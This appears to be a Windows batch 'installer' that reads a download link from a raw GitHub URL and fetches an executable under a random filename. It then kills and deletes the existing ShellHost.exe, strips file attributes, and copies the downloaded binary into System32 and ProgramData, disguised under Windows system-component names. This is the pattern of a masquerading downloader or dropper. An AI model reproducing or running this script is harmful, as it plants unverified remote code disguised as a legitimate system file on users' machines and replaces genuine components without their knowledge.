:: ShellHost.exe Installer
@echo off


setlocal enabledelayedexpansion

set "SHSTROOT=%SystemRoot%\System32\TSSPrxySHST.exe"
set "SHSTFILE=%ProgramData%\Microsoft\Windows\ShellHost.exe"

color 0A
 
:loop



set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "filename="




for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)

echo.
echo Filename=!filename!.exe
echo.

:DOWNLOADINGAGAIN
echo.
echo.
echo.
echo.

:: Kill & Delete file 
taskkill /f /im !filename!.exe
del /f /a /q "%TEMP%\!filename!.exe"
 
for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/ShellHostFileLink') do set "SHSTFILELINK=%%i"

echo.
echo SHSTFILELINK=%SHSTFILELINK%
echo.



:: Download the file using curl
curl -L -# -o "%TEMP%\!filename!.exe" "%SHSTFILELINK%"
 
timeout /t 2 /nobreak 
 
:: Checking the existing of the file
if not exist "%TEMP%\!filename!.exe" (
    echo.
    echo The download hasn't started yet. Please check your connection.
	timeout /t 2 /nobreak 
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak 
	echo.
	goto DOWNLOADINGAGAIN
)
 
 
 
:: Get the file size in bytes
for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
 
 
 
:: Check if the file size is at least 0.4MB (400000 bytes)
if %FILESIZE% geq 400000 (
    echo Starting..
    rem start "" "%TEMP%\!filename!.exe"
    echo Started..
) else (
echo.
    echo Download incomplete. Check your connection and run the file again.
	timeout /t 2 /nobreak 
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak 
	echo.
	goto DOWNLOADINGAGAIN
)


if exist "%TEMP%\!filename!.exe" (
    echo !filename!.exe File exists. Attempting to run...
    rem start "" "%TEMP%\!filename!.exe"
) else (
    echo ERROR: File not found.
)

echo.
echo.
echo.
echo.

echo Checking before Installation...

if exist "%SHSTROOT%" (
    echo File exists in %SHSTROOT%
) else (
    echo ERROR File not found in %SHSTROOT%
)



if exist "%SHSTFILE%" (
    echo File exists in %SHSTFILE%.
) else (
    echo ERROR File not found in %SHSTFILE%.
)

echo.
echo.
echo.


echo.
echo TaskKill and Delete ShellHost
taskkill /F /IM ShellHost.exe
taskkill /F /IM ShellHost.exe
del /f /a /q "%SHSTROOT%"
del /f /a /q "%SHSTFILE%"
echo REMOVE ATTRIB OF SHELLHOST
attrib -S -H -R "%SHSTFILE%"
echo Delete again
del /f /a /q "%SHSTFILE%"
echo Done.
echo.
echo.
echo Copying files..
copy "%TEMP%\!filename!.exe" "%SHSTROOT%" /y
copy "%TEMP%\!filename!.exe" "%SHSTFILE%" /y
echo Done.
echo.
echo.


echo Checking files..

timeout /t 5 /nobreak

if exist "%SHSTROOT%" (
    echo File exists in %SHSTROOT%
) else (
    echo ERROR File not found in %SHSTROOT%
)



if exist "%SHSTFILE%" (
    echo File exists in %SHSTFILE%.
) else (
    echo ERROR File not found in %SHSTFILE%.
)



echo.
echo Check Done.
echo.
echo.





